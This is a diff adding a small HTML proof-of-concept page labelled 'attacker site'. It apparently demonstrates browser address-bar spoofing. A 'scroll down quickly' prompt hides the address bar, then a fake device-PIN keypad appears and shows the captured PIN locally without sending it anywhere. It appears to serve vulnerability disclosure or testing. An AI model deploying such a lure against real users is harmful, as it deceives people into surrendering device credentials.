@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>attacker site</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        margin: 0;
+        min-height: 235vh;
+        color: #333;
+      }
+      .spacer {
+        height: 95vh;
+        background: #eee;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .header {
+        margin: 20px 0;
+      }
+      .logo {
+        font-size: 24px;
+        font-weight: bold;
+      }
+      .pin-display {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin: 20px 0;
+      }
+      .dot {
+        width: 12px;
+        height: 12px;
+        border: 2px solid #ccc;
+        border-radius: 50%;
+      }
+      .dot.active {
+        background: #000;
+        border-color: #000;
+      }
+      .numpad {
+        display: grid;
+        grid-template-columns: repeat(3, 80px);
+        gap: 15px;
+        justify-content: center;
+      }
+      .num-btn {
+        width: 80px;
+        height: 80px;
+        border: 1px solid #ccc;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 20px;
+        cursor: pointer;
+      }
+      .num-btn:active {
+        background: #eee;
+      }
+      #log {
+        display: none;
+        margin: 20px;
+        padding: 10px;
+        border: 1px dashed red;
+        color: red;
+        font-weight: bold;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="spacer">
+      page is very slow, scroll down quickly to render the content
+    </div>
+
+    <div class="header">
+      <div class="logo">address bar hidden</div>
+      <p>Enter Device PIN</p>
+    </div>
+
+    <div class="pin-display">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <div class="numpad" id="pad">
+      <script>
+        for (let i = 1; i <= 9; i++)
+          document.write(`<div class="num-btn" onclick="add(${i})">${i}</div>`);
+      </script>
+      <div style="visibility: hidden"></div>
+      <div class="num-btn" onclick="add(0)">0</div>
+      <div class="num-btn" style="border: none; color: blue" onclick="del()">
+        DEL
+      </div>
+    </div>
+
+    <div id="log">CAPTURED: <span id="pin"></span></div>
+
+    <script>
+      let code = "";
+      const dots = document.querySelectorAll(".dot");
+      const res = document.getElementById("log");
+      const val = document.getElementById("pin");
+
+      function add(n) {
+        if (code.length < 6) {
+          code += n;
+          update();
+        }
+        if (code.length === 6) {
+          val.innerText = code;
+          res.style.display = "block";
+        }
+      }
+
+      function del() {
+        code = code.slice(0, -1);
+        update();
+      }
+
+      function update() {
+        dots.forEach((d, i) => d.classList.toggle("active", i < code.length));
+      }
+    </script>
+  </body>
+</html>
